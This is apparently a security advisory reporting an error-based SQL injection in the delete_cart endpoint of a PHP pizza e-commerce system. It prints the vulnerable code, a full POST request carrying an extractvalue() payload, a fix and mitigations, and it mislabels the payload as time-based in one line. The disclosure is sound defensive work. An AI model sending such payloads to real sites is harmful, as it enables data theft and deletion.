
## **Affected Version:**  
- **Pizza E-commerce System**: 1.0  

## **Vulnerability Information:**  
- **Vulnerability Type:** SQL Injection (Based Error)  
- **Severity:** HIGH  
- **Status:** Unpatched  

## **Vulnerable Endpoint:**  
- `/pizzafy/admin/ajax.php?action=delete_cart`

## **Overview**
The Pizzafy Ecommerce System contains critical SQL Injection vulnerabilities that allow an attacker to extract sensitive data, bypass authentication, and delete records from the database.

## **Vulnerability Description:**  
# Error-Based SQL Injection Vulnerability in DELETE Operation

## Vulnerability Description

A **Error-based SQL Injection vulnerability** was discovered in the **delete cart functionality** of the **Pizzafy Ecommerce System**. This vulnerability occurs because the `id` parameter is not properly sanitized, allowing an attacker to inject malicious SQL commands into the backend database query.

## Attack Technique

This attack relies on **Error-based SQL injection technique**, where the attacker uses the `extractvalue()` function to force the database to return sensitive data within error messages. When the system displays database errors, the attacker can:

- **Extract database names, table names, and column structures**
- **Retrieve usernames and password hashes**
- **Delete or manipulate sensitive records**
- **Escalate privileges through session data extraction**


## Impact

| Impact | Description |
|--------|-------------|
| **Confidentiality** | Full database schema and user credentials exposure |
| **Integrity** | Unauthorized deletion or modification of records |
| **Availability** | Mass deletion causing denial of service |
| **Privilege Escalation** | Session hijacking and administrative access |

## Proof of Concept (PoC)

### Vulnerable Code
```php
    public function delete_cart() {
        if(!isset($_SESSION['login_user_id'])) return "0";
        
        $id = $_POST['id'];
        $result = $this->conn->query("DELETE FROM cart WHERE id = $id");

         if(!$result) {
            return $this->conn->error;
         }

        return "1";
    }
```

Below is a **POST** request demonstrating the vulnerability using a **time-based SQL injection payload**:  

```
POST /pizzafy/admin/ajax.php?action=delete_cart HTTP/1.1
Host: localhost
Content-Length: 51
sec-ch-ua: 
Accept: */*
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
sec-ch-ua-mobile: ?0
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36
sec-ch-ua-platform: ""
Origin: http://localhost
Sec-Fetch-Site: same-origin
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Referer: http://localhost/pizzafy/index.php?page=home
Accept-Encoding: gzip, deflate
Accept-Language: pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7
Cookie: PHPSESSID=ifhk52o8akrt2j78pkbcg9d649
Connection: close

id=-1 OR extractvalue(1,concat(0x7e,database())) --

```

### **Explanation:**  
This payload injects the SQL command:  

```sql
-1 OR extractvalue(1,concat(0x7e,database())) --
```
This makes it possible to get data from the database.

---

## Image

- ![](https://i.imgur.com/RVkhN7B.png)
---

## Remediation
```php
// FIXED CODE
public function delete_cart() {
    if(!isset($_SESSION['login_user_id'])) return "0";
    
    $id = (int)$_POST['id'];  // CAST TO INTEGER
    
    $this->conn->query("DELETE FROM cart WHERE id = $id");
    return "1";
}
```

---

## **Mitigation Recommendations:**  
1. **Use Prepared Statements:** Employ parameterized queries to prevent SQL injection.  
2. **Input Validation:** Validate and sanitize the `id` parameter to allow only expected values (e.g., numeric IDs).  
3. **Database Permissions:** Restrict database user privileges to limit the potential damage of SQL injections.  
4. **Monitoring & Logging:** Track and alert unusual patterns, such as slow queries or repetitive access attempts.  
5. **Security Testing:** Perform regular penetration testing and code reviews to identify and mitigate vulnerabilities.  
6. **Error Handling:** Avoid exposing database-related errors in responses, which may assist attackers.

## References
- **CWE-89:** Improper Neutralization of Special Elements used in an SQL Command
- **OWASP:** SQL Injection Prevention Cheat Sheet
